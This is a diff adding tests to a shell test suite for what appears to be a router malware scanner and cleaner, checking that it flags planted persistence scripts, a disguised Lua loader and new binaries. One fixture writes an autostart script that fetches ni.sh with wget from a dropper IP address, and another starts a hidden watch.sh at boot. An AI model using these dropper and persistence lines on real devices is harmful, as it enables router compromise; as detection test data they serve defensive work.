@@ -398,5 +398,25 @@ timeout 60 sh "$T" --root "$D/m" --upper "$D/u" --lower "$OWO" -o "$D/out" --fix
 expect "--fix ends too and removes the malware (exit $rc)" '[ $rc != 124 ] && [ ! -e "$D/m/etc/config/.gl" ]'
 umount "$D/m"
 
+echo "=== smaller gaps (issue 10)"
+D=$(mkscen gaps "$OWO"); U=$D/u
+mkdir -p "$U/usr/bin" "$U/etc/udhcpc.user.d" "$U/etc/init.d" "$U/etc/config" "$U/bin" "$U/etc/hotplug.d/iface"
+ln -s /bin/busybox "$U/usr/bin/netstat"
+printf '#!/bin/sh\necho hi\n' >"$U/etc/udhcpc.user.d/10-mine"
+printf '#!/bin/sh\n/etc/glinet/.cache/watch.sh &\n' >"$U/etc/init.d/S99w"
+printf '#!/bin/sh\nwget http://66.245.219.252:8000/ni.sh\n' >"$U/etc/hotplug.d/iface/99-x"
+printf '\033Lua junk get_mac_form_proc domain_table\n' >"$U/bin/ulogd"
+printf "config cloud\n\toption enable '1'\n" >"$U/etc/config/gl-cloud"
+mkdir -p "$U/usr/lib/opkg"; printf 'Package: gl-sdk4-cloud\nVersion: 1.2.3-4\n\nPackage: other\nVersion: 9\n' >"$U/usr/lib/opkg/status"
+mnt "$D" "$OWO"
+run "$D" "$OWO" --check >"$D/check.txt"; rc=$?
+expect "a new netstat link that the firmware does not have = REVIEW" 'grep -A1 "REVIEW  *new-link  */usr/bin/netstat" "$D/check.txt" | grep -q "busybox"'
+expect "a script in udhcpc.user.d = REVIEW" 'grep -q "REVIEW  *new  */etc/udhcpc.user.d/10-mine" "$D/check.txt"'
+expect "an init script that starts watch.sh = IOC persist-ref" 'grep -q "IOC  *persist-ref  */etc/init.d/S99w" "$D/check.txt"'
+expect "an autostart file with the KVM dropper address = REVIEW kvm-ref" 'grep -A1 "REVIEW  *kvm-ref  */etc/hotplug.d/iface/99-x" "$D/check.txt" | grep -q "66.245.219.252"'
+expect "the loader is recognised by its function names" 'grep -A1 "IOC  *backdoor-file  */bin/ulogd" "$D/check.txt" | grep -q "compiled Lua.*function names of the analysed loader"'
+expect "GoodCloud state and client version are printed" 'grep -q "GoodCloud now  *on (gl-sdk4-cloud 1.2.3-4)" "$D/check.txt"'
+umount "$D/m"
+
 echo; echo "RESULT: $pass passed, $fail failed"
 [ "$fail" = 0 ]
